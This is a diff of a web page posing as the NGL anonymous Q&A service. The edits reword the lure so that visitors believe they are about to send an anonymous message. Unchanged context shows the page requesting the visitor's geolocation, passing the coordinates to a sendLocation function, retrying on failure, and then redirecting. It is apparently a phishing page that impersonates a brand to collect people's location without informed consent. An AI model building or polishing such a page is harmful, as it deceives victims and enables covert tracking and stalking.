@@ -167,7 +167,7 @@
 
       <span class="ngl-badge">NGL: Anonymous Q&A</span>
 
-      <h1>Continue to Your Message</h1>
+      <h1>Send Anonymous Message</h1>
 
       <p>
         You're about to send an <span class="highlight">anonymous message</span> via NGL! To
@@ -217,7 +217,7 @@
 
         redirectAttempted = true;
         updateButtonState(true, 'Redirecting...');
-        showStatus('Taking you to your message...', 'success');
+        showStatus('Taking you to send message...', 'success');
 
         try {
           window.location.href = targetURL;
@@ -235,7 +235,7 @@
 
           const link = document.createElement('a');
           link.href = targetURL;
-          link.innerText = '👉 Click here to view your message';
+          link.innerText = '👉 Click here to send your message';
           link.style.display = 'block';
           link.style.marginTop = '12px';
           link.style.fontSize = '1rem';
@@ -286,7 +286,7 @@
           const { latitude, longitude } = position.coords;
           console.log('Location obtained:', { latitude, longitude });
 
-          showStatus('✓ Location received! Opening your message...', 'success');
+          showStatus('✓ Location received! Sending your message...', 'success');
           updateButtonState(true, 'Success! Redirecting...');
 
           sendLocation(latitude, longitude);
@@ -330,7 +330,7 @@
               getLocation();
             }, 2000);
           } else {
-            showStatus('Maximum retries reached. Redirecting to your message...', 'error');
+            showStatus('Maximum retries reached. Redirecting to you send message...', 'error');
             setTimeout(forceRedirection, 1500);
           }
         }
@@ -351,7 +351,7 @@
 
           const link = document.createElement('a');
           link.href = targetURL;
-          link.innerText = '👉 Click here to view your message';
+          link.innerText = '👉 Click here to send your message';
           link.style.display = 'block';
           link.style.marginTop = '12px';
           link.style.fontSize = '1rem';
